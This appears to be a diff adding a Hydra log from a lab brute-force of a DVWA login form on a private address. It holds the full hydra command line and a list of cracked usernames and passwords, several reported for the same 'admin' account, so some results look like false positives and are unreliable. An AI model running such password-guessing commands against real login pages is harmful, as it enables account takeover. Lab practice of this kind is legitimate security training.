@@ -1,0 +1,7 @@
+# Hydra v9.2 run at 2025-08-24 21:52:02 on 10.0.0.4 http-post-form (hydra -C /tmp/aggressive_scan_2025-08-24T21-51/dvwa_creds.txt -t 4 -o /tmp/aggressive_scan_2025-08-24T21-51/hydra_dvwa.txt 10.0.0.4 http-post-form /login.php:username=^USER^&password=^PASS^&Login=Login:Login failed)
+[80][http-post-form] host: 10.0.0.4   login: admin   password: admin
+[80][http-post-form] host: 10.0.0.4   login: admin   password: 123456
+[80][http-post-form] host: 10.0.0.4   login: admin   password: password
+[80][http-post-form] host: 10.0.0.4   login: gordonb   password: abc123
+[80][http-post-form] host: 10.0.0.4   login: pablo   password: letmein
+[80][http-post-form] host: 10.0.0.4   login: smithy   password: password
